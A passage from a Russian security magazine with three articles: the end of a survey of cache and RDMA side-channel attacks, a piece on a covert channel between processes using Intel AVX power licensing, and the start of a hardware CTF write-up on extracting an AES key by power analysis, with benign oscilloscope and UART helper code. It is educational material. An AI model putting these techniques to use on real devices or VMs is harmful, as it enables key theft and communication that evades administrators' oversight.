   Во‐первых, RNIC кеширу ет метаданные в SRAM. И когда происходит обра‐
щение к метаданным, которые находят ся за пределами SRAM, это приводит
к задержке. Во‐вторых, все обра щения RDMA из всех приложений вынуждены
разделять общую память на сетевой карте.


             INFO

                  Метаданные делятся на три типа: QP, MR и PTE.
                       Получив сетевой зап рос, RNIC должен  опре‐
                         делить, к какому соединению этот зап рос отно‐
                        сится (QP), какие регионы памяти для него допус‐
                     тимы (MR) и, наконец, к какой странице он обра‐
                     щается (PTE). Каждое обращение к RDMA нуж‐
                        дается во всех трех типах метаданных. Если
                         какие‐то отсутствуют в SRAM, RNIC извлекает их
                       из основной памяти, приостанавливая зап рос
                      до  тех  пор,  пока  необходимая  информация
                      не под грузится из свопа.


Используя разницу во времени, мож но запус тить ата ки по обходным каналам
и достоверно определить, к какому QP, MR и PTE обращалась жертва. При‐
веденные выше проб лемы и экс плуатирует Pythia, нарушая конфиденциаль‐
ность шаблонов обращений.





              Как выглядит RDMA глазами злоумышленника

Основная идея атаки сос тоит в том, чтобы забросать сервер запросами и в
итоге полностью запол нить SRAM сетевой карты. Таким образом, любые
оставшиеся от жер твы метаданные будут кешированы в основную память.
После этого злоумышленник обра щается к целевым данным с помощью
нового запроса RDMA и, основываясь на задержке ответа, делает вывод,
обращалась ли жертва к ним.
  Сама по себе такая атака ана логична Evict + Reload. Однако пос кольку
Pythia имеет дело с RDMA, перед ней возникает любопытная головоломка:
так как работа ведется с общедоступной средой (а не с изолированной),
задержки ответов на запросы RDMA могут сущес твенно варьироваться. Они
во многом зависят от того, сколько людей подклю чено к серверу в данный
момент.
   Традиционный подход использования константного порогового значения
для определения попадания или промаха в кеш здесь не подходит. Поэтому
Pythia использует адаптивный метод — динамически обу чаемый классифика‐
тор.
   Какие преимущества дает зло дею использование атак по обходным
каналам на основе RDMA? Во‐первых, односторонний шаблон связи поз‐
воляет преступнику скрыть свои следы, ведь такие обращения остаются
за пределами внимания сервера. Во‐вторых, сети на основе RDMA намного
более быстрые (поддерживают до 200 Гбит/с, с латентностью 0,6 мкс), что
позволяет злодею про водить через  них мел козернистые высокопроиз‐
водительные  атаки. Наконец,  такие односторонние коммуникации  идут
в обход операционной системы сервера и в обход его процессора, что поз‐
воляет снизить помехи при тайминговых атаках.


ПОДВОДИМ ИТОГИ
Итак, мы разобрали девять новейших атак по обходным каналам на основе
микроархитектурных уязвимостей кеша ЦП. Что же можно про них сказать?
  В первую очередь стоит заметить, что атакующие теперь стараются раз‐
делять свои силы по двум основным направлениям. Пока одни пытаются най‐
ти новые уязвимости в уже реализованных методах защиты, другие пере‐
ориентировались и выб рали в качес тве своих про межуточных целей сторон‐
ние аппаратные компоненты: буфер ассоциативной трансляции, буфер сте ка
возвратов, обработчик прерываний и про чее.
  Кроме того, следует сог ласиться, что с течением вре мени подобного рода
атаки становятся все увлекательней и изощ ренней. Сейчас даже труд но
представить, что можно придумать еще более хит роумные, нес тандартные
и впечатляющие способы, чем описанные выше.
  И все же что‐то (воз можно, опыт?) подска зывает мне, что в ближайшие
пару лет придется выпустить очередное продолжение этого спис ка. Так что —
до встречи!
COVERSTORY
НЕОБЫЧНЫЙ
ВЕКТОР


НАЛАЖИВАЕМ СКРЫТЫЕ
КОММУНИКАЦИИ
МЕЖДУ ПРОЦЕССАМИ
В ЧИПАХ INTEL





Системные программисты с незапамятных
времен   любят   обсуждать   извечный
философский вопрос: как двум про цессам
лучше  всего  наладить  вза имо действие?           Антон Карев
                                                                                    Эксперт по информационной
                                                                                          безопасности. ОбластьИ можно ли в каких‐то случаях избежать
                                                                                     профессиональных
                                                                                    интересов — технологическаяненужного посредника в виде операци‐                                                                                         разведка, аналитика в сфере
                                                                       ИБ и искусственныйонной системы? Оказыва ется, это вполне                                                                                                 интеллект
реально:  дос таточно  только  спуститься           vedacoder@mail.ru
на  уровень  ниже,  к  аппа ратной  части,
и  поискать  решение  среди  векторных
регистров процес сора.


SIMD-SIMD, ОТКРОЙСЯ!
Сегодняшний рассказ о найденном внутри набора команд сюрпризе был бы
неполным без краткой предыстории. Впервые векторные регистры у ком‐
пании Intel появились в процес сорах Pentium MMX (MultiMedia eXtensions)
в 1997 году. Сегодня их ширина (64 бит) выглядит вполне стандартной,
но более чем двадцать лет назад так, конечно, никто не счи тал.
  В самой компании новыми инс трукциями SIMD (Single Instruction, Multiple
Data) очень гордились, и было решено даже пос вятить их популяризации
целый номер Intel Technology Journal.
  Направление развития и впрямь оказалось удачным, и уже через два года
вместе с анонсом Pentium  III архитектура набора команд пополнилась тех‐
нологией SSE (Streaming SIMD Extensions, 128 бит). C появлением улучшений
и новых версий эта технология просущес твовала до выхода Sandy Bridge
с AVX (Advanced Vector Extensions, 256 бит) в 2011 году.
  В более новых архитектурах компания Intel пошла еще дальше, дополнив
набор ISA (Instruction Set Architecture) группой расширений AVX2 (Haswell,
2013). Вполне вероятно, что именно их поддерживает твой нынешний процес‐
сор. Впрочем, если ты предпочитаешь серверные решения, то начиная
с Knights Landing (2016) специально для тебя сущес твует набор AVX‐512 (с
угадай какой шириной регистров).





  В графическом виде раз витие принципа SIMD применительно к процес‐
  сорам Intel выглядит так


КТО НЕ РАБОТАЕТ — ТОТ НЕ ЕСТ
Предыдущая картинка призвана навес ти тебя на простую мысль: регистры
у нас большие и регистров у нас много. А раз так, операции со значениями
в таких регистрах дол жны потреблять больше энергии, попутно преобразовы‐
вая ее в тепло (которое предстоит еще как‐то отвести от кристалла процес‐
сора).
  Более того, даже прос то поддерживать регистры SIMD в активном сос‐
тоянии весьма расточительно с точки зрения энергозатрат. Поэтому Skylake
и более поздние архитектуры активируют их только по мере необходимос ти.
Если процессор работает в скалярном режиме, круп норазмерные регис тры
находятся в деак тивированном сос тоянии.
  Процессор пробуждает векторные регистры только в том слу чае, если
какое‐нибудь ядро натыка ется на инс трукции SIMD в коде. Однако процесс
перевода регистров в активное состояние — дело небыстрое.
  Поэтому в тот промежуток времени, когда потребность в крупнораз‐
мерных регистрах уже воз никла, но «проснуть ся» они еще не успе ли, век‐
торный код обрабатывается микрокодом, который оперирует более корот‐
кими регистрами и, следова тельно, работает примерно на половине скорос‐
ти.
  С другой стороны, после того как цепочка векторных команд заканчива‐
ется и потребность в круп норазмерных регис трах отпадает, обрабаты‐
вающее их ядро снова деактивирует эти регистры. И опять‐таки не сразу —
на случай, если поблизости ока жутся еще какие‐нибудь векторные команды.
  На первый взгляд это все может показать ся совершенно излишним,
но попытаемся разоб раться во внутренней логике и мотивах инженеров ком‐
пании Intel.


БЮРОКРАТИЯ В ПРОЦЕССОРЕ
Что же в действительности происходит, когда у какого‐нибудь ядра, обна‐
ружившего векторную команду, возникает пот ребность в получении допол‐
нительной электроэнергии для работы с AVX? Оказывается, оно не может
самостоятельно выделить себе необ ходимые амперы — для этого требуется
получить разрешение у PCU (Package Control Unit).
  По сути, это такой встроенный микроконтрол лер, который регулирует так‐
товые частоты и напряжение питания процессора. Помимо прочего, он сле‐
дит за температурой самого кристалла и при критических значениях уводит
ядро в режим тротлинга, чтобы не возникало перег рева.


             INFO

                   PCU ни в коем случае не сто ит путать с SMC (Sys‐
                      tem Management Controller), который обычно рас‐
                        полагается на самой материнской плате и сле дит
                        за работоспособностью всей системы в целом,
                       контролируя обмен информацией по низкоско‐
                      ростному интерфейсу SMBus.


Таким образом, решение о подаче дополнитель ного питания принимает
исключительно PCU, руководс твуясь собственными правилами и текущей
ситуацией. В документации Intel такой процесс называется выдачей лицензии
на электроэнергию.
  При этом ядру может быть предос тавлено нес колько видов лицензии,
в зависимости от типа команд, которые оно собирается выполнять. Для всех
базовых инструкций AVX и некоторых прос тых инс трукций AVX2 (загрузка
или сложение) ядру выписывается номинальная лицензия LVL0_TURBO_LI‐
CENSE. На обработку слож ных команд AVX2 PCU выдает лицензию серьезней:
LVL1_TURBO_LICENSE.
  А уж если какому‐нибудь ядру посчастливилось наткнуться на AVX‐512, то
ему предоставляется лицензия премиум‐клас са — LVL2_TURBO_LICENSE.
Однако при этом ядро процессора ока зывается ограниченным не только
в питании, но и в максимальной тактовой час тоте.
  В спецификациях Intel это упомина ется как минимальная гарантируемая
частота (AVX Turbo) для ситуации, когда все ядра процессора оказались пол‐
ностью загружены обра бот кой инструкций SIMD.
   Рассмотрим реальный пример и попытаемся понять, к чему это все при‐
водит на практике. Максимальная частота серверного процессора Intel Xeon
Gold 6130 для скалярных инструкций сос тавляет 2,8 ГГц. Если нагрузить его
векторными инструкциями из числа базовых, максимальная час тота уже упа‐
дет до 2,4 ГГц. Наиболее же серьезным испытанием станут как раз команды
из набора AVX‐512, заботами PCU частота при этом не пре высит 1,9 ГГц.
  Важный нюанс: в процессорах, уста новленных в коммерческих ПК и ноут‐
буках, эти ограничения накладываются не толь ко на ядро, выполняющее
в данный момент векторный код, но и на все остальные ядра процес сора.
А вот серверные решения в этом пла не более гиб кие и позволяют PCU нас‐
траивать профиль питания индивиду ально.


        WWW

                     За дополнительной информацией о технологии
                     AVX рекомендую обратиться к документации In‐
                                 tel —  Software  Development  Manual  (с.  333).
                    А самые интересные особенности реализации,
                       которые и легли в основу этой идеи, обнаружи‐
                       лись в дополнительном материале Optimization
                        Reference Manual (с. 644).



ВОПРОС НА МИЛЛИОН
Вникая в технические дебри всех этих ману алов и спецификаций, в какой‐то
момент я задался вопросом: если PSU все же выдает лицензию, то что про‐
исходит с векторными регистрами остальных ядер того же процессора? Если
они тоже переходят в активное сос тояние, то можно ли этим как‐то восполь‐
зоваться? Например, дать своим процес сам воз можность обмениваться
сообщениями, не прибегая для это го к услугам ОС.


ВРЕМЯ — ИНФОРМАЦИЯ — ВРЕМЯ-ШТРИХ
Отталкиваясь от такого своего поверхностного знакомства с внутренними
принципами управле ния электропитанием в процессорах  Intel, я написал
небольшой демонстрационный код. Он запускает два процесса, которые вза‐
имодействуют друг с другом без какого‐либо обременительного пос редни‐
чества со стороны ОС.





Процесс‐отправитель переда ет данные бит за битом. Для передачи единички
процесс‐отправитель  выполняет  очень  длинную  цепочку  умножений
с помощью команд AVX2 (чтобы разбудить векторные регистры), а для
передачи нолика впадает в спячку (чтобы PCU принял решение отозвать свою
лицензию на электропитание и деактивиро вать тем самым векторные регис‐
тры).





Процесс‐получатель выполняет короткую цепочку  векторных инструкций
и затем тоже засыпает на дос таточно дол гое время, чтобы PCU решил отоз‐
вать лицензию на электропитание. Помимо прочего, процесс‐получатель
отслеживает скорость своего выполнения посредством команды rdtsc.
Для наглядности результат периодически выгружа ется в stdout.





Таким образом, если процесс‐получатель выполняется в «период покоя»
процесса‐отправителя, то векторные регистры будут неактивны. Из‐за этого
его скорость выполнения окажется значительно ниже, не менее 150 тысяч
тактов. Это примерно соответствует «времени про буждения» регис тров YMM
на Coﬀee Lake и нулю на таком канале передачи информации.
   Если же векторные регистры находятся в пол ной  готовности, про‐
цесс‐получатель выполняется уже не с помощью микрокода, а аппаратно.
Это будет гораздо быстрее, и такая ситуация в моей реализации соответству‐
ет единичке.
  Повторяя для верности описанный алгоритм достаточное количество раз,
процесс‐получатель сможет доподлинно узнать, какой бит ему был передан
процессом‐отправите лем. На следующем рисунке ты можешь видеть гра‐
фическое представление данных, снятых таким образом с процес соров
на архитектурах Kaby Lake, Coﬀee Lake и Sky Lake.





АЛЬТЕРНАТИВНЫЙ ВАРИАНТ
Имея на руках рабочий пример кода, уже можно было бы остановиться,
а эксперимент считать завершенным. Но всегда любопытно, сущес твуют ли
у задачи другие решения. Порой это позволя ет взгля нуть на проблему
под новым углом, найти неожиданные идеи.
  Оказывается, есть еще как минимум один спо соб использовать векторные
регистры для передачи информации меж ду процессами. Он заключается
в измерении тактовой частоты ядра в скалярном режиме и в режиме работы
с наборами SIMD.
   Как я уже упоминал, PCU реагирует на запрос от ядра не мгновенно, а с
некоторой задержкой (по документации, на это может уходить до 500 мкс).
За это время ядро уже начинает выполнять инструкции AVX, но тактовая час‐
тота предусмотрительно сбрасывается, чтобы не выйти за границы текущего
режима энергопотребления.
   Если PCU удовлетво ряет запрос, тактовая частота снова вырастает.
В дальнейшем, когда кончается учас ток кода с векторны ми инструкциями,
ядро пробует вернуться к прежнему режиму. Но на это снова требуется вре мя
(порядка двух миллисекунд) и свободный от инструкций SIMD участок кода.
   Таким образом, дозированно подавая на выполнение команды AVX
в нашей программе, мы можем влиять не толь ко на сос тояние самих век‐
торных регистров, но и на час тоту процессора. Подробнос ти ты можешь про‐
читать в статье Матиаса Готшлага и Фрэнка Беллосы, хоть она и посвящена
проблеме произво дительнос ти при работе с AVX.
   Так что, если мой материал тебя заин тересовал, но сле по копировать при‐
веденный выше код тебе не хочется, можешь попробовать реализовать собс‐
твенный вариант, уже с помощью измерений тактовой частоты.
  Окажется ли такое решение более быстрым и надежным, или, наоборот,
качество канала связи только ухудшится — кто зна ет? В любом случае, если
тебе захочется поделить ся своими результатами, я всегда буду рад их услы‐
шать.


ЗАКЛЮЧЕНИЕ
Описанный метод стал воз можным благодаря тому, что процесс выдачи
лицензий с помощью PCU раскрывает стороннему наблюдате лю внутреннее
состояние системы. Таким образом появляет ся обходной канал утечки
информации, эксплуатировать который в собственных целях — вопрос опыта
и сообразительности.
   Рассмотрим теперь кратко те преимущес тва и воз можнос ти, которые
открывает перед нами столь необычный способ коммуникации.
   Во‐первых, процессы‐собеседники избегают тех надоедливых системных
вызовов, которые делают разрабатываемые нами программы непригодными
для портирования.
   Во‐вторых, взаимодействие происхо дит через команды процессора, а не
через ввод‐вывод. Думаю, ты согласишься, что это гораздо приятнее.
  Наконец, благодаря такому методу два про цес са из совершенно разных
виртуальных машин могут общать ся друг с другом без необходимости пре‐
одолевать утомительные бюрократические процеду ры, требующие участия
системного администратора.
  Надеюсь, тебе представит ся подходящая возможность, чтобы опробовать
мою идею в деле. Получится ли у тебя сделать на ее основе что‐то изящ ное
и нетривиальное? Есть только один способ проверить — приступить к экспе‐
риментам незамедлительно. :)
COVERSTORY
АППАРАТНЫЙ
CTF





                 ЛЕГКИЙ СПОСОБ УЗНАТЬ
                 КЛЮЧ ШИФРОВАНИЯ,
                КОГДА У ТЕБЯ ПОД РУКОЙ
              ОСЦИЛЛОГРАФ И НОУТБУК





Хардварные crackme в этом сезоне сно ва
набирают популярность. Их полюбили орга‐
низаторы профильных конференций, и они
все чаще встречаются в тематических кон‐
курсах. В этой статье мы разберем один               faberge                                                                             Цифровыхъ дѣлъ мастеръ
из  реальных  прош логодних  примеров       fabulous.faberge@yandex.ru
и  заодно  узнаем,  как  выглядит  ата ка
по  энергопотреблению  на  ключ  шиф‐
рования устройства.


В 2016  году компания  Riscure про водила  конкурс среди  энтузиастов
информационной безопас ности RHme2. Задачи на реверс бинарников, циф‐
ровых протоколов, криптогра фию и  эксплуата цию  уязвимостей решали
на единой аппаратной платформе — это была кро хотная плата Arduino Nano
с микроконтроллером AVR. Позднее, на конференции RSA 2018 в Сан‐Фран‐
циско, один из организа торов конкурса сетовал на то, что лишь немногие
участники пробовали свои силы в аппа рат ных атаках по второс тепенным
каналам (АВК) и атаках методом инду цированных сбоев (АМИС).
  Остальные же посчитали подобные способы черес чур сложными, дороги‐
ми и нере алистичными и отка зались от дальнейших попыток. Чтобы показать,
что и такой вектор атаки стоит рас сматривать в качестве потенциальной угро‐
зы, Рафаэль Буа Карпи (Rafael Boix Carpi) из Riscure в ходе выступле ния
успешно решил одну из задач на обо рудовании стоимостью менее 60 дол‐
ларов (не считая ноутбука). Так что стартовый набор для начинающего иссле‐
дователя аппаратных уязвимостей сегодня доступен как никогда раньше!
  В исполне нии инструктора из Riscure атака кажется настолько прос той
и изящной, что хочется повторить ее пря мо здесь и сейчас. Что я практически
сразу же и сделал, с некото рыми изменениями и дополнениями.


           WARNING

                    Ин формация  в  статье  предназначена  исклю‐
                        чительно для образовательных целей. Редакция
                      и автор не несут ответственности за любое про‐
                       тивоп равное применение и причиненный ущерб.



СОВРЕМЕННОЕ ЖЕЛЕЗО
В первую очередь было решено выбрать в качестве цели более акту альное
железо. Arduino и AVR — это прекрасно, это наше наследие, и к нему нужно
относиться с подобающим ува жением, а не ломать направо и налево.
Но сегодня бал правят микроконтроллеры на ядре ARM (Cortex‐M). И веро‐
ятнее всего, имен но их ты обнаружишь, рас потрошив ближай шее умное
устройство — беспроводную розетку, лампочку с Wi‐Fi и прочие прелести
сомнительной автоматизации.
  На первый взгляд, бюджетный микроконтроллер STM32F091 (Cortex‐M0)
на плате Nucleo‐64 идеаль но подходил на роль подопытного кролика.
По сравнению с Arduino Nano это решение выглядит выигрышно буквально
по всем параметрам: раз рядность 32 бит (против восьми), тактовая час‐
тота 48 МГц (против шестнадцати) и напряжение питания всего 3,3 В против
пяти. Что касается цены, нужно учесть, что оригинальные итальянские платы
Arduino стоят как минимум столько же, если не дороже.





Такой выбор на самом деле осложня ет атаку — не всякий бюджетный
осциллограф сможет угнаться за микроконтроллером на подобных скоростях.
Использование Hantek DSO6022 из презентации было бы заранее обречено
на провал, достаточ но только взглянуть на его характерис тики.
  К счастью, у меня на сто ле стоял осциллограф RTC1002 компании Rohde &
Schwarz. Если верить рекламным матери алам, это модель начального уровня,
но это обманчивое впечатление. Да, такой осциллог раф стоит как флагман‐
ский смартфон, но у него масса полезных функций, и он максимально удобен.


СУТЬ АТАКИ
Остальные условия изна чального конкурса я решил не менять. Мы по‐преж‐
нему будем анализировать трассы энергопотребления нашего устройства
в момент шифрования данных и пытать ся уга дать хранящийся в памяти
пароль. Шифр — AES в режиме ECB с длиной клю ча в 128 бит.
  Конечно, на практике в реальном устройстве ты, скорее всего, обна‐
ружишь AES в режиме CBC, но я так и не при думал, как органично вписать
вектор инициализации в усло вия задачи. Сам по себе IV без ключа шиф‐
рования не представляет осо бой ценности для зло умышленника и нередко
передается в открытом виде (примером тому могут слу жить протоколы
SSL/TLS, смотри RFC 5246).


             INFO

                    Порой  встречается ошибочное мнение, будто
                         у  алгоритма AES переменный размер блока.
                      Это не совсем так, размер блока всегда фик‐
                       сирован и составляет ровно 128 бит. А вот у сим‐
                      метричных  шифров  семейства  «Рэндал»   (к
                       которому и относится AES) размер бло ка дей‐
                        ствительно    различается    и    составляет
                         от 128 до 256 бит (с шагом 32 бит). При этом
                       размер ключа и количество раун дов шифрования
                        могут варьироваться. Так, существуют AES‐128
                         (десять раун дов), AES‐192 (двенадцать раундов)
                      и AES‐256 (четырнадцать раундов).


Сам по себе алгоритм AES считается одним из лучших, используется прак‐
тически повсеместно, и на сегодняшний день для него не извес тно ни одной
реальной уязвимости. Что же может пойти не так и есть ли у нас вообще шан‐
сы на успех?
  Все дело в том, что операции любого процес сора на самом низком уров‐
не сводятся к переключению транзисторов. На это расходуется энергия, пот‐
ребление которой можно фиксировать. Зная алгоритм шифрования, входные
данные и замеряя параметры питания, мы можем попытаться угадать дво‐
ичное представление ключа (количес тво транзисторов в активном сос‐
тоянии). И это будет однозначно гораз до лучше, чем простой перебор! (Да
что угодно лучше, чем простой перебор, если уж откровенно.) :)
  Конечно, на практике все окажется не так легко: в любой современной
схеме транзисторов неприлично много, существу ют нелинейные процессы,
внешние наводки почти всег да неизбежны, а сама попытка провести изме‐
рения неизбежно вносит свой негативный вклад в точность полученных дан‐
ных.
  К счастью, на нашей стороне будет статистика — если удастся собрать
достаточное количество информа ции, полезный сигнал будет преобладать
над шумами и мы смо жем узнать ключ. В нашем слу чае речь идет о пяти
тысячах осциллограмм, каж дая по тридцать тысяч  точек. Я бы назвал
это «большими данными», но специалис ты, вероятно, будут смеяться, поэто‐
му обойдемся без громких заявлений.
   Таким образом, прин цип ата ки следующий: мы посылаем с компьютера
на вход исследуемого устройства случайный набор чисел, устройство их
шифрует и отправляет обратно, а осциллограф внимательно сле дит за рас‐
ходом электроэнергии (счетчикам ЖКХ такая точность и не снилась). Пос ле
этого по команде с компь ютера мы сохраняем осциллограмму и набор дан‐
ных (вход и выход) и повторя ем про цесс.
  В теории все выглядит соб лазнительно просто, не так ли? Сколько раз я
так ошибался.


ПОДГОТОВКА ПЛАТЫ
Начнем с отладоч ной платы: ее предсто ит немножко испортить, но тут уж
ничего не поделаешь. В первую очередь удалим с текстолита все лишнее, что
может как‐то потреблять или накапливать энергию, — нам нужен максималь‐
но чистый сигнал с самого микроконтрол лера, а не с конденсаторов из его
обвязки.
  Отламываем программа тор ST‐Link — широкие прорези в самой плате
намекают на то, что он прекрасно будет работать и отдельно от основной
части. Если опасаешься повредить плату и выдрать целый кусок, попробуй
сперва подпилить соединения обычной ножовкой, сра зу дол жно быть проще.
   Теперь наступил черед конденса торов в цепи питания. Микроконтрол лер
требует 3,3 В, но это совместимая с Arduino плата, и она рассчитана на внеш‐
ний источник питания 5 В, за это отвечает линей ный DC/DC‐преобразователь
LD39050PU33R. То, что он линейный, — это хорошо, от импульсного были бы
лишние помехи.
   Конденсаторы С20 и С21 на входе можно оставить, а вот С18 и С19 явно
лишние, сме ло бери паяльник в руки и выпаивай. Да их тут и не было! Также
совершенно необязательны конденсаторы С23, С24, С27 и C28. У них
какие‐то смешные емкости — 100 нФ — мож но даже не обращать внимания.
Понравилось? Все, стой, остальные пусть живут!
   Теперь о грустном. Мы перед этим отломали программатор, но он нам все
еще нужен. Ты ведь его не выбросил, верно? Это было очень предусмотри‐
тельно! И дело не в том, что программатор нам понадобится для того, чтобы
прошить микроконтрол лер. Нет, это, ока зывается, еще и переходник с USB —
UART, и с его помощью мы будем общаться с компь ютером.
  Проблема в том, что дорожки RX/TX интерфейса UART располагались
как раз на перемычках, которые мы до этого перерезали. На программаторе
эти сигналы доступны на разъеме CN3, но на самой плате с F091 контакты
D0/D1 разъема CN9 не подсоединены к микроконтрол леру. За это отве чают
перемычки SB62 и SB63 на обратной стороне пла ты, так что соедини их
парой капель припоя.
   Кстати, ты обратил внимание, что на плате отсутс твует кварцевый резона‐
тор на месте X3? Есть «часовой» кварц на 32,768 кГц на мес те X2, но он пред‐
назначен для RTC. Оказывается, ST‐Link, кроме того что выполняет свои
основные функции, еще и генерирует опорную час тоту в 8 МГц для основного
микроконтроллера! Это линия МСО на схеме (вывод PF0).
  В отличие от интерфейса UART, этот сигнал не выведен ни на какие кон‐
такты, и без него F091 работать точно отка жется. Мне не пришло в голову
ничего лучше, чем купить в ближайшем магазине радиодеталей кварцевый
генератор на 8 МГц. Его следует подключить к линии 5 В. При этом меандр
будет с амплитудой 5 В вместо положенных 3,3 В, но это не страшно, так
как вывод PF0 обозначен в даташите на микроконтроллер как FT, то есть сов‐
местимый с пятиволь товой логикой.





Остается только отпаять перемычку SB50 и запа ять SB55, чтобы вывести
ножку PF0 на 29‐й контакт разъема CN7. Вполне вероятно, сейчас тебя
занимает только одна мысль: зачем раз работчики в ST придумали такую
сложную схему? Оказывается, на такой печат ной плате основана вся модель‐
ная линейка отладок Nucleo‐64, а это почти двадцать разных версий. Кон‐
кретная версия отличается сочета нием всех этих крошечных перемычек.


ПИШЕМ ПРОШИВКУ
Теперь нужна программная реализация алгоритма AES. Сотрудни ки Riscure
после проведения конкурса RHme2 выложили исходники примеров на своем
GitHub. Но воспользовать ся ими не получится по той простой причине, что
они платформенно зависимые. Таблицы подста новок шифра AES с помощью
макросов pgm_read_byte программируются во флеш, который раз ворачи‐
вается в цепочку инструкций ассемблера для AVR.


             INFO

                     Все дело в том, что мик роконтроллеры ATmega
                       следуют прин ципам  гарвардской  архитектуры,
                        где память команд и память дан ных разнесены
                      и существуют в отдельных адресных пространс‐
                           твах.  Изначально  многие  компиляторы  (нап‐
                       ример, GCC) поп росту не уме ли работать с такой
                        организацией памяти и даже кон стантные объ‐
                       екты при исполнении программы располагались
                        в  ОЗУ.  Поэтому  приходилось  использовать
                      ассемблерные вставки для оптимизации и «руч‐
                        ного» размещения кон стантных данных в постоян‐
                      ной памяти.


Понятно, что для F091 на ARM такой код запус тить не удас тся. Поэтому я выб‐
рал стороннюю реализацию AES в режиме ECB, дописав недостающие куски
самостоятельно. В целом это была самая простая часть, логика программы
полностью повторяет принцип работы ори гиналь ного примера из RHme2.
Заранее сгенерированный случайным обра зом ключ AES будет храниться
в самом устройстве:


/* Key is: 0x47f1ed9166c996b2f553b147be3fbc20 (128‐bit) */
const uint8_t key[] = {0x47, 0xF1, 0xED, 0x91, 0x66, 0xC9, 0x96,
    0xB2, 0xF5, 0x53, 0xB1, 0x47, 0xBE, 0x3F, 0xBC, 0x20};




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
    АППАРАТНЫЙ CTF
                         ЛЕГКИЙ СПОСОБ УЗНАТЬ
               КЛЮЧ ШИФРОВАНИЯ, КОГДА У ТЕБЯ
            ПОД РУКОЙ ОСЦИЛЛОГРАФ И НОУТБУК





ЗАЧЕМ ОСЦИЛЛОГРАФУ ETHERNET
Протестировав работоспособность пла ты и про шивки в «Мониторе порта»
из Arduino IDE, я вручную поймал пару осциллограмм в момент шифрования
сообщений. Первые трас сы выглядели как‐то так.





Угадать здесь десять раундов AES можно раз ве что при очень большом
желании. Соотношение шумов и полезного сигнала на осциллограмме
оставляло желать лучшего. Увеличив час тоту дис кретизации и поиграв с нас‐
тройками фильтров на приборе, я смог получить уже более приличные кадры.





Хорошо заметны одинаковые  скачки энергопотребления при переходе
от одного раунда к другому — такой паттерн трудно с чем‐то спутать, и уга‐
дать длину ключа тут можно чисто визуально (по количеству повторений сиг‐
нала).
   Теперь нужно было как‐то авто матизировать сбор и сохранение осциллог‐
рамм. Rohde & Schwarz на своем сайте предлага ет использовать утилиту HM‐
Explorer, но при беглом ознакомлении с документацией я пришел к неуте‐
шительному выводу, что ее воз можнос тей мне недостаточно.
  Одно дело — прос то удаленно управлять прибором с компьютера
по интерфейсу GPIB или Ethernet с помощью набора инс трукций SCPI. Но мне
предстояло еще одновременно забирать энтропию с /dev/urandom и нап‐
равлять ее в мик роконтроллер по пос ледователь ному порту. Проще было
написать реализацию самос тоятельно.
   Чуть выше я упомянул набор SCPI — это стандарти зированный способ
взаимодействия с инстру ментами самых раз ных производителей. Краткую
справку по командам я нашел в конце документации на сам осциллограф
RTC1002, но дополнительно у R&S есть исчерпывающее руководство SCPI
Programming Manual.
  По сути, во всем большом наборе у нас есть три вида инструкций. Общие
команды поддерживают все совместимые по стандарту устройства. Они поз‐
воляют узнать, с каким конкретно прибором мы сейчас работаем.


/*  CMD: *IDN?
 *  ANS: ROHDE&SCHWARZ,RTC1002,XXXXXXXXX,YYY.ZZZ
 */

Следующими идут базовые команды, они определя ют состояние и работу
инструмента. Для них есть полная форма (все символы в сообщении) и сок‐
ращенная форма (толь ко символы в верхнем регистре).


/*  CMD: RUNContinous (RUNC)
 *  ANS: None
 */

Наконец, у нас есть команды для конкретных настроек прибора. Они сос‐
тавляют большую часть набора SCPI и для удобства вложены в различные
пространства имен. Можно задать частоту дис кретизации, вертикальное
и горизонтальное отклонение, задержку сра батывания триггера и много чего
еще. В общем, тут удаленно дос тупен буквально любой пункт меню. Более
того, можно посылать по сети собственные сооб щения и отображать их
на экране. :)


/*  CMD: DISPlay:DIALog::MESSage (DISP:DIAL:MESS)
 *  ANS: None
 *
 *  CMD: CHANnel1:DATA:HEADer? (CHAN1:DATA:HEAD?)
 *  ANS: ‐9.477E‐008,9.477E‐008,30000,1
 */

Таким образом, подклю чив осциллог раф к одной сети с ноутбуком и нас троив
IP‐адреса, можно работать с прибором через сокеты из любой программы
на С:


#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


#define PORT        (5025)
#define HOST        ("192.168.10.11")
#define SCPI_BUFFER (512)


int scpi_init(char* ip, int port) {
  int sd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in server = {.sin_family = AF_INET,
                               .sin_port = htons(port)};


  inet_pton(AF_INET, ip, &server.sin_addr);
  connect(sd, (struct sockaddr *) &server, sizeof(server));


  return sd;
}


int scpi_cmd_write(int sd, char* cmd) {
  return write(sd, cmd, strlen(cmd));
}


int scpi_cmd_read(int sd, char* cmd, char* b) {
  if (scpi_cmd_write(sd, cmd) != strlen(cmd)) {
    return ‐1;
  }


  return read(sd, b, SCPI_BUFFER);
}


СОБИРАЕМ ВСЕ ВМЕСТЕ
Для завершения подготовитель ного этапа осталось реализовать ровно две
вещи: работу с последова тельным портом и получение случайных чисел
с источника энтропии в системе. В целом ничего сложного, но есть пара
нюансов:


int uart_open(char* path) {
  int fd = open(path, O_RDWR | O_ASYNC);
  struct termios attr;


  /* Set parameters for UART communication */
  tcgetattr(fd, &attr);
  cfsetospeed(&attr, B115200);
  cfsetispeed(&attr, B115200);
  attr.c_cflag &= ~(PARENB | CSTOPB | CSIZE);
  attr.c_cflag |= CS8 | CLOCAL;
  attr.c_lflag = ICANON;
  attr.c_oflag &= ~OPOST;


  tcsetattr(fd, TCSANOW, &attr);
  tcflush(fd, TCIOFLUSH);


  return fd;
}


int uart_recv(int fd, char *b, int len) {
  int i = 0;


  for (char c = 0; i < len && c != '\n'; ++i) {
    read(fd, &c, 1);
    b[i] = c;
  }


  return i;
 }


int uart_send(int fd, char *b, int len) {
  return write(fd, b, len);;
}


int uart_close(int fd) {
  return close(fd);
}

Что касается случайных чисел, то на самом деле их можно было генерировать
непосредственно на микроконтроллере. И даже отдельный аппаратный TRNG
тут совершенно необязателен. Если стоит задача получить энтропию из раз‐
ряда «дешево и сердито», можно обойтись и шумами в АЦП, недавно я писал
в «Хакер» статью об этом.


char vLUT(char n) {
  return n >= 10 ? n + 'A' ‐ 10 : n + '0';
}


void get_rand(char* buffer, int n) {
  int rd = open("/dev/urandom", O_RDONLY);


  read(rd, buffer, n);
  close(rd);


  for(int i = 0; i < n; ++i) {
    buffer[i] &= 0x0F;
    buffer[i] = vLUT(buffer[i]);
  }
}

